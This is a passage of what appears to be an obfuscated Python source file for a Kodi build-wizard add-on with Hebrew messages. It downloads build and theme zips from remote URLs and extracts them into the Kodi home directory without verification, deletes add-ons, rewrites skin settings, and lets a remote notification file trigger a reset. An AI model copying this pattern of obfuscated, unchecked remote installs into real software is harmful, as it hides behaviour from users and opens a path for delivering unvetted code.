		OOOOO0O0OOOOO00O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3883
		try :#line:3884
			OOO0OO0OOOOOOOOOO =open (OOOOO0O0OOOOO00O0 ,'r')#line:3885
			O0OO00O0000OOOOOO =OOO0OO0OOOOOOOOOO .read ()#line:3886
			OOO0OO0OOOOOOOOOO .close ()#line:3887
			OOOO0O0O00O0OO0OO ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3888
			O0O00OO0OOO000000 =re .compile (OOOO0O0O00O0OO0OO ).findall (O0OO00O0000OOOOOO )[0 ]#line:3889
			OOO0OO0OOOOOOOOOO =open (OOOOO0O0OOOOO00O0 ,'w')#line:3890
			OOO0OO0OOOOOOOOOO .write (O0OO00O0000OOOOOO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0O00OO0OOO000000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3891
			OOO0OO0OOOOOOOOOO .close ()#line:3892
		except :#line:3893
				pass #line:3894
		wiz .kodi17Fix ()#line:3895
		OOOOO0O0OOOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3896
		try :#line:3897
			OOO0OO0OOOOOOOOOO =open (OOOOO0O0OOOOO00O0 ,'r')#line:3898
			O0OO00O0000OOOOOO =OOO0OO0OOOOOOOOOO .read ()#line:3899
			OOO0OO0OOOOOOOOOO .close ()#line:3900
			OOOO0O0O00O0OO0OO ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3901
			O0O00OO0OOO000000 =re .compile (OOOO0O0O00O0OO0OO ).findall (O0OO00O0000OOOOOO )[0 ]#line:3902
			OOO0OO0OOOOOOOOOO =open (OOOOO0O0OOOOO00O0 ,'w')#line:3903
			OOO0OO0OOOOOOOOOO .write (O0OO00O0000OOOOOO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0O00OO0OOO000000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3904
			OOO0OO0OOOOOOOOOO .close ()#line:3905
		except :#line:3906
				pass #line:3907
		swapSkins ('skin.Premium.mod')#line:3908
def buildWizard (O00O0O0000O0OOO0O ,OOOOOOO00OOOO0000 ,theme =None ,over =False ):#line:3911
	OO000000O0000O0OO =xbmcgui .DialogBusy ()#line:3912
	OO000000O0000O0OO .create ()#line:3913
	if over ==False :#line:3914
		OOOO0OOOO000OO0O0 =wiz .checkBuild (O00O0O0000O0OOO0O ,'url')#line:3915
		if USERNAME =='':#line:3916
			ADDON .openSettings ()#line:3917
			sys .exit ()#line:3918
		if PASSWORD =='':#line:3919
			ADDON .openSettings ()#line:3920
			sys .exit ()#line:3921
		if BUILDNAME =='':#line:3923
			O0O00O000OOO0OOO0 =u_list (SPEEDFILE )#line:3924
			(O0O00O000OOO0OOO0 )#line:3925
		if OOOO0OOOO000OO0O0 ==False :#line:3926
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3931
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3932
			return #line:3933
		O00OO000O00O0000O =wiz .workingURL (OOOO0OOOO000OO0O0 )#line:3934
		if O00OO000O00O0000O ==False :#line:3935
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00OO000O00O0000O ))#line:3936
			return #line:3937
	if OOOOOOO00OOOO0000 =='gui':#line:3938
		if O00O0O0000O0OOO0O ==BUILDNAME :#line:3939
			if over ==True :OOO0000O0O0OO0O00 =1 #line:3940
			else :OOO0000O0O0OO0O00 =1 #line:3941
		else :#line:3942
			OOO0000O0O0OO0O00 =1 #line:3943
		if OOO0000O0O0OO0O00 :#line:3944
			remove_addons ()#line:3945
			remove_addons2 ()#line:3946
			debridit .debridIt ('update','all')#line:3947
			traktit .traktIt ('update','all')#line:3948
			OOO00OOOOO0O0O000 =wiz .checkBuild (O00O0O0000O0OOO0O ,'gui')#line:3949
			O0OOOO0OOO000O0O0 =O00O0O0000O0OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3950
			if not wiz .workingURL (OOO00OOOOO0O0O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3951
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3952
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O0000O0OOO0O ),'','אנא המתן')#line:3953
			OO00O0OOO0O000O0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOOO0OOO000O0O0 )#line:3954
			try :os .remove (OO00O0OOO0O000O0O )#line:3955
			except :pass #line:3956
			logging .warning (OOO00OOOOO0O0O000 )#line:3957
			if 'google'in OOO00OOOOO0O0O000 :#line:3958
			   O0O0OO0O000OOOOO0 =googledrive_download (OOO00OOOOO0O0O000 ,OO00O0OOO0O000O0O ,DP ,wiz .checkBuild (O00O0O0000O0OOO0O ,'filesize'))#line:3959
			else :#line:3962
			  downloader .download (OOO00OOOOO0O0O000 ,OO00O0OOO0O000O0O ,DP )#line:3963
			xbmc .sleep (100 )#line:3964
			OOOOOO0OOOO0OO0OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O0000O0OOO0O )#line:3965
			DP .update (0 ,OOOOOO0OOOO0OO0OO ,'','אנא המתן')#line:3966
			extract .all (OO00O0OOO0O000O0O ,HOME ,DP ,title =OOOOOO0OOOO0OO0OO )#line:3967
			DP .close ()#line:3968
			wiz .defaultSkin ()#line:3969
			wiz .lookandFeelData ('save')#line:3970
			wiz .kodi17Fix ()#line:3971
			if KODIV >=18 :#line:3972
				skindialogsettind18 ()#line:3973
			debridit .debridIt ('restore','all')#line:3974
			traktit .traktIt ('restore','all')#line:3975
			if INSTALLMETHOD ==1 :OO00O0O0O000O0000 =1 #line:3977
			elif INSTALLMETHOD ==2 :OO00O0O0O000O0000 =0 #line:3978
			else :DP .close ()#line:3979
			O00OOOO0000O0000O =(NOTIFICATION2 )#line:3980
			OOO00O00O0O0OOO00 =urllib2 .urlopen (O00OOOO0000O0000O )#line:3981
			OOO0O0OO000O0O00O =OOO00O00O0O0OOO00 .readlines ()#line:3982
			OOO00000O00O0O0O0 =0 #line:3983
			for O00OO00OOOOOOO000 in OOO0O0OO000O0O00O :#line:3986
				if O00OO00OOOOOOO000 .split (' ==')[0 ]=="noreset"or O00OO00OOOOOOO000 .split ()[0 ]=="noreset":#line:3987
					xbmc .executebuiltin ("ReloadSkin()")#line:3989
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3990
					update_Votes ()#line:3991
					indicatorfastupdate ()#line:3992
				if O00OO00OOOOOOO000 .split (' ==')[0 ]=="reset"or O00OO00OOOOOOO000 .split ()[0 ]=="reset":#line:3993
					update_Votes ()#line:3995
					indicatorfastupdate ()#line:3996
					resetkodi ()#line:3997
		else :#line:4006
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4007
	if OOOOOOO00OOOO0000 =='gui2':#line:4008
		if O00O0O0000O0OOO0O ==BUILDNAME :#line:4009
			if over ==True :OOO0000O0O0OO0O00 =1 #line:4010
			else :OOO0000O0O0OO0O00 =1 #line:4011
		else :#line:4012
			OOO0000O0O0OO0O00 =1 #line:4013
		if OOO0000O0O0OO0O00 :#line:4014
			remove_addons ()#line:4015
			remove_addons2 ()#line:4016
			OOO00OOOOO0O0O000 =wiz .checkBuild (O00O0O0000O0OOO0O ,'gui')#line:4017
			O0OOOO0OOO000O0O0 =O00O0O0000O0OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4018
			if not wiz .workingURL (OOO00OOOOO0O0O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4019
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4020
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O0000O0OOO0O ),'','אנא המתן')#line:4021
			OO00O0OOO0O000O0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOOO0OOO000O0O0 )#line:4022
			try :os .remove (OO00O0OOO0O000O0O )#line:4023
			except :pass #line:4024
			logging .warning (OOO00OOOOO0O0O000 )#line:4025
			if 'google'in OOO00OOOOO0O0O000 :#line:4026
			   O0O0OO0O000OOOOO0 =googledrive_download (OOO00OOOOO0O0O000 ,OO00O0OOO0O000O0O ,DP ,wiz .checkBuild (O00O0O0000O0OOO0O ,'filesize'))#line:4027
			else :#line:4030
			  downloader .download (OOO00OOOOO0O0O000 ,OO00O0OOO0O000O0O ,DP )#line:4031
			xbmc .sleep (100 )#line:4032
			OOOOOO0OOOO0OO0OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O0000O0OOO0O )#line:4033
			DP .update (0 ,OOOOOO0OOOO0OO0OO ,'','אנא המתן')#line:4034
			extract .all (OO00O0OOO0O000O0O ,HOME ,DP ,title =OOOOOO0OOOO0OO0OO )#line:4035
			DP .close ()#line:4036
			wiz .defaultSkin ()#line:4037
			wiz .lookandFeelData ('save')#line:4038
			if INSTALLMETHOD ==1 :OO00O0O0O000O0000 =1 #line:4041
			elif INSTALLMETHOD ==2 :OO00O0O0O000O0000 =0 #line:4042
			else :DP .close ()#line:4043
		else :#line:4045
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4046
	elif OOOOOOO00OOOO0000 =='fresh':#line:4047
		freshStart (O00O0O0000O0OOO0O )#line:4048
	elif OOOOOOO00OOOO0000 =='normal':#line:4049
		if url =='normal':#line:4050
			if KEEPTRAKT =='true':#line:4051
				traktit .autoUpdate ('all')#line:4052
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4053
			if KEEPREAL =='true':#line:4054
				debridit .autoUpdate ('all')#line:4055
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4056
			if KEEPLOGIN =='true':#line:4057
				loginit .autoUpdate ('all')#line:4058
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4059
		OOOO0OO0O00O0000O =int (KODIV );O0000O0OOO00OOO0O =int (float (wiz .checkBuild (O00O0O0000O0OOO0O ,'kodi')))#line:4060
		if not OOOO0OO0O00O0000O ==O0000O0OOO00OOO0O :#line:4061
			if OOOO0OO0O00O0000O ==16 and O0000O0OOO00OOO0O <=15 :O00OO000O0O0O00OO =False #line:4062
			else :O00OO000O0O0O00OO =True #line:4063
		else :O00OO000O0O0O00OO =False #line:4064
		if O00OO000O0O0O00OO ==True :#line:4065
			OO00O000O0000O000 =1 #line:4066
		else :#line:4067
			if not over ==False :OO00O000O0000O000 =1 #line:4068
			else :OO00O000O0000O000 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4069
		if OO00O000O0000O000 :#line:4070
			wiz .clearS ('build')#line:4071
			OOO00OOOOO0O0O000 =wiz .checkBuild (O00O0O0000O0OOO0O ,'url')#line:4072
			O0OOOO0OOO000O0O0 =O00O0O0000O0OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4073
			if not wiz .workingURL (OOO00OOOOO0O0O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4074
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4075
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,O00O0O0000O0OOO0O ,wiz .checkBuild (O00O0O0000O0OOO0O ,'version')),'','אנא המתן')#line:4076
			OO00O0OOO0O000O0O =os .path .join (PACKAGES ,'%s.zip'%O0OOOO0OOO000O0O0 )#line:4077
			try :os .remove (OO00O0OOO0O000O0O )#line:4078
			except :pass #line:4079
			logging .warning (OOO00OOOOO0O0O000 )#line:4080
			if 'google'in OOO00OOOOO0O0O000 :#line:4081
			   O0O0OO0O000OOOOO0 =googledrive_download (OOO00OOOOO0O0O000 ,OO00O0OOO0O000O0O ,DP ,wiz .checkBuild (O00O0O0000O0OOO0O ,'filesize'))#line:4082
			else :#line:4085
			  downloader .download (OOO00OOOOO0O0O000 ,OO00O0OOO0O000O0O ,DP )#line:4086
			xbmc .sleep (1000 )#line:4087
			OOOOOO0OOOO0OO0OO ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O0000O0OOO0O ,wiz .checkBuild (O00O0O0000O0OOO0O ,'version'))#line:4088
			DP .update (0 ,OOOOOO0OOOO0OO0OO ,'','אנא המתן...')#line:4089
			O0OOOO00OO0O000O0 ,O0000O0O00O0O0000 ,O00OO0O0O000O0OOO =extract .all (OO00O0OOO0O000O0O ,HOME ,DP ,title =OOOOOO0OOOO0OO0OO )#line:4090
			if int (float (O0OOOO00OO0O000O0 ))>0 :#line:4091
				try :#line:4092
					wiz .fixmetas ()#line:4093
				except :pass #line:4094
				wiz .lookandFeelData ('save')#line:4095
				wiz .defaultSkin ()#line:4096
				wiz .setS ('buildname',O00O0O0000O0OOO0O )#line:4098
				wiz .setS ('buildversion',wiz .checkBuild (O00O0O0000O0OOO0O ,'version'))#line:4099
				wiz .setS ('buildtheme','')#line:4100
				wiz .setS ('latestversion',wiz .checkBuild (O00O0O0000O0OOO0O ,'version'))#line:4101
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4102
				wiz .setS ('installed','true')#line:4103
				wiz .setS ('extract',str (O0OOOO00OO0O000O0 ))#line:4104
				wiz .setS ('errors',str (O0000O0O00O0O0000 ))#line:4105
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OOOO00OO0O000O0 ,O0000O0O00O0O0000 ))#line:4106
				fastupdatefirstbuild (NOTEID )#line:4107
				wiz .kodi17Fix ()#line:4108
				skin_homeselect ()#line:4109
				skin_lower ()#line:4110
				rdbuildinstall ()#line:4111
				skinfix18 ()#line:4115
				try :os .remove (OO00O0OOO0O000O0O )#line:4117
				except :pass #line:4118
				OOOOOO00000O0000O =(ADDON .getSetting ("auto_rd"))#line:4119
				if OOOOOO00000O0000O =='true':#line:4120
					try :#line:4121
						setautorealdebrid ()#line:4122
					except :pass #line:4123
				try :#line:4124
					autotrakt ()#line:4125
				except :pass #line:4126
				DP .close ()#line:4138
				O0O00O0O000OO0OO0 =wiz .themeCount (O00O0O0000O0OOO0O )#line:4139
				builde_Votes ()#line:4140
				indicator ()#line:4141
				if not O0O00O0O000OO0OO0 ==False :#line:4142
					buildWizard (O00O0O0000O0OOO0O ,'theme')#line:4143
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4144
				if INSTALLMETHOD ==1 :OO00O0O0O000O0000 =1 #line:4145
				elif INSTALLMETHOD ==2 :OO00O0O0O000O0000 =0 #line:4146
				else :resetkodi ()#line:4147
				if OO00O0O0O000O0000 ==1 :wiz .reloadFix ()#line:4149
				else :wiz .killxbmc (True )#line:4150
			else :#line:4151
				if isinstance (O0000O0O00O0O0000 ,unicode ):#line:4152
					O00OO0O0O000O0OOO =O00OO0O0O000O0OOO .encode ('utf-8')#line:4153
				O0O0OO00O000000OO =open (OO00O0OOO0O000O0O ,'r')#line:4154
				OOO0O0O0OO0O00O0O =O0O0OO00O000000OO .read ()#line:4155
				O0OO00O0000OOO00O =''#line:4156
				for OO0O0O0OOOO0O0O0O in O0O0OO0O000OOOOO0 :#line:4157
				  O0OO00O0000OOO00O ='key: '+O0OO00O0000OOO00O +'\n'+OO0O0O0OOOO0O0O0O #line:4158
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O00OO0O0O000O0OOO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0OO00O0000OOO00O )#line:4159
		else :#line:4160
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4161
	elif OOOOOOO00OOOO0000 =='theme':#line:4162
		if theme ==None :#line:4163
			O0O00O0O000OO0OO0 =wiz .checkBuild (O00O0O0000O0OOO0O ,'theme')#line:4164
			O0OOOO0000OO00OO0 =[]#line:4165
			if not O0O00O0O000OO0OO0 =='http://'and wiz .workingURL (O0O00O0O000OO0OO0 )==True :#line:4166
				O0OOOO0000OO00OO0 =wiz .themeCount (O00O0O0000O0OOO0O ,False )#line:4167
				if len (O0OOOO0000OO00OO0 )>0 :#line:4168
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O00O0O0000O0OOO0O ,COLOR1 ,len (O0OOOO0000OO00OO0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4169
						wiz .log ("Theme List: %s "%str (O0OOOO0000OO00OO0 ))#line:4170
						OO0OO00O00OO0O0OO =DIALOG .select (ADDONTITLE ,O0OOOO0000OO00OO0 )#line:4171
						wiz .log ("Theme install selected: %s"%OO0OO00O00OO0O0OO )#line:4172
						if not OO0OO00O00OO0O0OO ==-1 :theme =O0OOOO0000OO00OO0 [OO0OO00O00OO0O0OO ];OOO00O000000OOOOO =True #line:4173
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4174
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4175
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4176
		else :OOO00O000000OOOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O00O0O0000O0OOO0O ,wiz .checkBuild (O00O0O0000O0OOO0O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4177
		if OOO00O000000OOOOO :#line:4178
			O0OO0O0OO0O0OOO00 =wiz .checkTheme (O00O0O0000O0OOO0O ,theme ,'url')#line:4179
			O0OOOO0OOO000O0O0 =O00O0O0000O0OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4180
			if not wiz .workingURL (O0OO0O0OO0O0OOO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4181
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4182
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4183
			OO00O0OOO0O000O0O =os .path .join (PACKAGES ,'%s.zip'%O0OOOO0OOO000O0O0 )#line:4184
			try :os .remove (OO00O0OOO0O000O0O )#line:4185
			except :pass #line:4186
			downloader .download (O0OO0O0OO0O0OOO00 ,OO00O0OOO0O000O0O ,DP )#line:4187
			xbmc .sleep (1000 )#line:4188
			DP .update (0 ,"","Installing %s "%O00O0O0000O0OOO0O )#line:4189
			OO000OO0OOO00O0O0 =False #line:4190
			if url not in ["fresh","normal"]:#line:4191
				OO000OO0OOO00O0O0 =testTheme (OO00O0OOO0O000O0O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4192
				OO0O0OO0O0O000000 =testGui (OO00O0OOO0O000O0O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4193
				if OO000OO0OOO00O0O0 ==True :#line:4194
					wiz .lookandFeelData ('save')#line:4195
					OO0O00000OOOO00OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4196
					O0OO0O0000OO000O0 =xbmc .getSkinDir ()#line:4197
					skinSwitch .swapSkins (OO0O00000OOOO00OO )#line:4199
					OOO0O0OO000O0O00O =0 #line:4200
					xbmc .sleep (1000 )#line:4201
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0O0OO000O0O00O <150 :#line:4202
						OOO0O0OO000O0O00O +=1 #line:4203
						xbmc .sleep (1000 )#line:4204
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4205
						wiz .ebi ('SendClick(11)')#line:4206
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4207
					xbmc .sleep (1000 )#line:4208
			OOOOOO0OOOO0OO0OO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4209
			DP .update (0 ,OOOOOO0OOOO0OO0OO ,'','אנא המתן')#line:4210
			O0OOOO00OO0O000O0 ,O0000O0O00O0O0000 ,O00OO0O0O000O0OOO =extract .all (OO00O0OOO0O000O0O ,HOME ,DP ,title =OOOOOO0OOOO0OO0OO )#line:4211
			wiz .setS ('buildtheme',theme )#line:4212
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OOOO00OO0O000O0 ,O0000O0O00O0O0000 ))#line:4213
			DP .close ()#line:4214
			if url not in ["fresh","normal"]:#line:4215
				wiz .forceUpdate ()#line:4216
				if KODIV >=17 :wiz .kodi17Fix ()#line:4217
				if OO0O0OO0O0O000000 ==True :#line:4218
					wiz .lookandFeelData ('save')#line:4219
					wiz .defaultSkin ()#line:4220
					O0OO0O0000OO000O0 =wiz .getS ('defaultskin')#line:4221
					skinSwitch .swapSkins (O0OO0O0000OO000O0 )#line:4222
					OOO0O0OO000O0O00O =0 #line:4223
					xbmc .sleep (1000 )#line:4224
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0O0OO000O0O00O <150 :#line:4225
						OOO0O0OO000O0O00O +=1 #line:4226
						xbmc .sleep (1000 )#line:4227
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4229
						wiz .ebi ('SendClick(11)')#line:4230
					wiz .lookandFeelData ('restore')#line:4231
				elif OO000OO0OOO00O0O0 ==True :#line:4232
					skinSwitch .swapSkins (O0OO0O0000OO000O0 )#line:4233
					OOO0O0OO000O0O00O =0 #line:4234
					xbmc .sleep (1000 )#line:4235
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0O0OO000O0O00O <150 :#line:4236
						OOO0O0OO000O0O00O +=1 #line:4237
						xbmc .sleep (1000 )#line:4238
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4240
						wiz .ebi ('SendClick(11)')#line:4241
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4242
					wiz .lookandFeelData ('restore')#line:4243
				else :#line:4244
					wiz .ebi ("ReloadSkin()")#line:4245
					xbmc .sleep (1000 )#line:4246
					wiz .ebi ("Container.Refresh")#line:4247
		else :#line:4248
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4249
def skin_homeselect ():#line:4253
	try :#line:4255
		OO00O00OO000OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4256
		O0OOOOO000O000OOO =open (OO00O00OO000OO0OO ,'r')#line:4258
		OOOOO0O0O0O00OOO0 =O0OOOOO000O000OOO .read ()#line:4259
		O0OOOOO000O000OOO .close ()#line:4260
		O0OO000OO00OO00OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4261
		O000O0000OOOO0O00 =re .compile (O0OO000OO00OO00OO ).findall (OOOOO0O0O0O00OOO0 )[0 ]#line:4262
		O0OOOOO000O000OOO =open (OO00O00OO000OO0OO ,'w')#line:4263
		O0OOOOO000O000OOO .write (OOOOO0O0O0O00OOO0 .replace ('<setting id="HomeS" type="string%s/setting>'%O000O0000OOOO0O00 ,'<setting id="HomeS" type="string"></setting>'))#line:4264
		O0OOOOO000O000OOO .close ()#line:4265
	except :#line:4266
		pass #line:4267
def skin_lower ():#line:4270
	O0OO0OOO000OO00O0 =(ADDON .getSetting ("lower"))#line:4271
	if O0OO0OOO000OO00O0 =='true':#line:4272
		try :#line:4275
			O00OO00O0O0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4276
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'r')#line:4278
			OO0OOO0000OO000O0 =O0OO0000OO000000O .read ()#line:4279
			O0OO0000OO000000O .close ()#line:4280
			OO00O0O0000OO0O00 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4281
			OOOOO0000O0O0O0O0 =re .compile (OO00O0O0000OO0O00 ).findall (OO0OOO0000OO000O0 )[0 ]#line:4282
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'w')#line:4283
			O0OO0000OO000000O .write (OO0OOO0000OO000O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOOOO0000O0O0O0O0 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4284
			O0OO0000OO000000O .close ()#line:4285
			O00OO00O0O0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4287
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'r')#line:4289
			OO0OOO0000OO000O0 =O0OO0000OO000000O .read ()#line:4290
			O0OO0000OO000000O .close ()#line:4291
			OO00O0O0000OO0O00 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4292
			OOOOO0000O0O0O0O0 =re .compile (OO00O0O0000OO0O00 ).findall (OO0OOO0000OO000O0 )[0 ]#line:4293
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'w')#line:4294
			O0OO0000OO000000O .write (OO0OOO0000OO000O0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOOOO0000O0O0O0O0 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4295
			O0OO0000OO000000O .close ()#line:4296
			O00OO00O0O0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4298
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'r')#line:4300
			OO0OOO0000OO000O0 =O0OO0000OO000000O .read ()#line:4301
			O0OO0000OO000000O .close ()#line:4302
			OO00O0O0000OO0O00 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4303
			OOOOO0000O0O0O0O0 =re .compile (OO00O0O0000OO0O00 ).findall (OO0OOO0000OO000O0 )[0 ]#line:4304
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'w')#line:4305
			O0OO0000OO000000O .write (OO0OOO0000OO000O0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOOOO0000O0O0O0O0 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4306
			O0OO0000OO000000O .close ()#line:4307
